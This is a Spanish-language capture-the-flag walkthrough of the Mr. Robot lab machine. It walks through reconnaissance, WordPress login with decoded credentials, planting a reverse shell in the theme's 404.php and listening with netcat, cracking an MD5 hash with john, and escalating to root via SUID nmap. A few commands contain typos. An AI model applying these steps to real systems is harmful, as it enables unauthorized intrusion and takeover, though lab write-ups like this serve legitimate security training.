# Reconocimiento y Enumeracion:
1. Se comienza con un escaneo de toda la red para obtener los ip disponibles.
2. Enumeramos todos los puertos de la ip obtenida. (22,80,443)
3. Lanzamos una serie de scripts basicos de reconocimiento.
	- ping -c 1 [IP] 
		Segun el ttl obtenemos el sistema, [linux m 64]
	- nmap --script=http-enum [IP]
		robots.txt
		Al revisar el robots.txt encontramos dos nombres de archivos.
			fsociety.dict
			key-1-of-3.txt
	- whatweb [IP]
		Obtenemos informacion de la red y vemos que corre bajo un wordpress, esto nos servira para mas tarde.
	- wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://[IP]/FUZZ
		Obtenemos:
		/images
		/css
		/image
		/license
		/feed
		/video
		/wp-login ---
		Revisando los directorios vemos algo interesante 
		en /wp-login.php:
			Encontramos el login de administracion de wordpress.
		en /license:
			Al hacerle un curl a http://[IP]/license obtenemos un texto en base64 al decodificar el texto obtenemos:
				elliot:ER28-0652
		Tenemos un posible usuario y contraseña.
Analisis de Vulnerabilidades:
4. Ahora que tenemos credenciales y un login podemos probar entrar.
Explotacion de Vulnerabilidades:
5. Una vez en configuracion nos desplazamos a:
	- Appearance	
	 - Editor
	  - 404.php

	Luego aqui inyectamos nuestra reverse shell, en este caso utilizamos la reverse shell de monkeypentester.
		- Editamos la ip y ponemos la nuestra y el puerto 443
	Ahora nos ponemos en escucha:
		- rlwrap nc -nlvp 443
Ahora vamos al navegador y abrimos.
	http://[IP]/1234 para que de error y se active el fichero y obtenemos una shell 

Post-Explotacion:
6. Una vez dentro realizamos una tratamiento de la tty para mayor movilidad
	- script /dev/null -c /bin/bash
	- export TERM=xterm
	- export SHELL=/bin/bash
	
7. Procedemos a enumerar el sistema:
	- whoami
	Somos el usuario daemon, revisamos el directorio /home y entramos al directorio robot:
		- key-2-of-3.txt
		- password.raw-md5
	Vemos que tenemos un archivo de texto pero no podemos abrir la flag y al revisarlo obtenemos:
		robot:[hash]
8. Escalada de privilegios:
	- Tenemos el usuario robot y su hash md5, intentamos crackear la contraseña en caso de ser debil
	john --wordlist /usr/share/wordlist/rockyou.txt file.hash
	- Luego de un rato obtenemos las credenciales.
	 *robot:abcdefghijklmnopqrstuvwxyz
	- Entramos por ssh robot@[IP] -p "abcdefghijklmnopqrstuvwxyz"
	Nos damos cuenta de que con este usuario si podemos abrir la flag

	Revisamos los permisos que tenemos:
	- id
	- group
	- sudo -l
	- find / -perm 4000 2 m /dev/null

	- Lo que nos llama la atencion en este caso es que nmap tiene como propietario al usuario root y posee el permiso SUID
	- Revisamos GTFObins de nmap y vemos que existe un vulnerabilidad:
		nmap --interactive
		nmapm !sh
	Tratamos la tty y ya somos root.
	Listamos el directorio /root y encontramos la tercera flag
